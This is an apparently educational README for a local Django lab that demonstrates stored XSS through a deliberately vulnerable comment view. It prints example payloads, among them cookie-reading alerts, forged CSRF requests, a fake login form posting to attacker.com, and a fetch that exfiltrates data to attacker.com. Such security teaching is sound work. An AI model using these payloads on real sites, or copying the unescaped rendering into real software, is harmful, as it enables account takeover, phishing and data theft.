
Seeing only the CSRF token does not imply that XSS is harmless. Cross-Site Scripting (XSS) enables attackers to execute JavaScript in the victim's browser, leading to various malicious outcomes such as authenticated actions, data exfiltration, UI manipulation, and even full account compromise — all possible even when session cookies are marked as HttpOnly.

XSS is particularly dangerous because it allows attackers to impersonate the user, rather than merely exposing cookies.

## The MOST IMPORTANT RULE (memorize this)

**“XSS does not magically affect other users; it affects whoever loads the infected page.”**

## In a real attack:
Imagine this scenario: “I planted a bomb in the page. Whoever opens the page triggers it.”
- The attacker injects the malicious script.
- Other users load the compromised page.
- The script executes in the context of those users.

## Real Casees (planted a bomb in the page)
## Case 1

I have this view
```python 
def stored_xss(request):
    if request.method == "POST": # here i have a vulnerability where user input is directly stored and rendered later
        XSSComment.objects.create(
            username=request.POST.get("username"),
            message=request.POST.get("message")  # RAW INPUT
        )
        return redirect("stored_xss")

    comments = XSSComment.objects.all() # i restore all comments where one of them may contain malicious script
    print(comments)
    return render(request, "Cross_Site_Scripting/stored_xss.html", {"comments": comments})
```
 if one of users(attacker) send comment as js now i store this js and
 restore it for other users when the request comments, 
 now js will run but this no my js it.
 ### Step 1 — user(attacker) enter js
he open page of http://127.0.0.1:8000/xss/stored/
and enter js as comment in input box
 ### Step 2 — app will save js
app will save js in db for other users to see comment of each others
 ### Step 3 boom
 user open http://127.0.0.1:8000/xss/stored/
 to get comment i set this {{ c.message|safe }} so he will interact with text with protection
 now js will load from db and run for new user
--------------------------------------------------------------------------------------------------
## Case 2

### Step 1 — Create two users

```css 
User A → Attacker
User B → Victim 
```

### Step 2 — Log in as User A
Navigate to your XSS page and submit the following payload:
go to 
http://127.0.0.1:8000/login/ login as A then open another browser as B
```html 
<!-- INTENTIONAL XSS: This allows you to escape this -->
?q=<script>alert('Reflected')</script> or more dangerous payloads
<script>alert(document.cookie)</script>

<script>
fetch("/delete-account/", {
    method: "POST",
    headers: {
        "X-CSRFToken": document.cookie.split("=")[1]
    }
})
</script>

<script>
document.body.innerHTML = `
    <h1>Session expired</h1>
    <form action="https://attacker.com/login">
        <input name="email" required>
        <input name="password" type="password" required>
    </form>
`
</script>

<script>
fetch("/xss-demo-action/", {
    method: "POST",
    headers: {
        "X-CSRFToken": document.cookie.split("=")[1]
    }
})
</script>
```
This payload is now stored in the database.

### Step 3 — User A Logs Out

### Step 4 — Log in as User B

Now, visit the page that displays the stored XSS:
```html 
<!-- BOOM BOOM BOOM -->
```
The script executes in the context of User B, not User A.

### Core Idea
As an attacker, you may not have direct access to perform certain actions, but you can manipulate other users into executing them without their knowledge.

--------------------------------------------------------------------------------------------------
## Case 3

attacker can steal cookies, user data for each user using user credentails save in cookies like

- Make authenticated requests on the user's behalf
- Extract CSRF tokens from the DOM or cookies
- Read sensitive data from the page
- sent this data to attacker system

by attacker not need username or password he will get cref_token and others token from user cookies
```javascript
// HttpOnly cookies are still sent automatically with requests
fetch('/api/sensitive-data', {
  credentials: 'include' // Cookies sent automatically
})
  .then(r => r.json())
  .then(data => {
    // Exfiltrate the data
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```
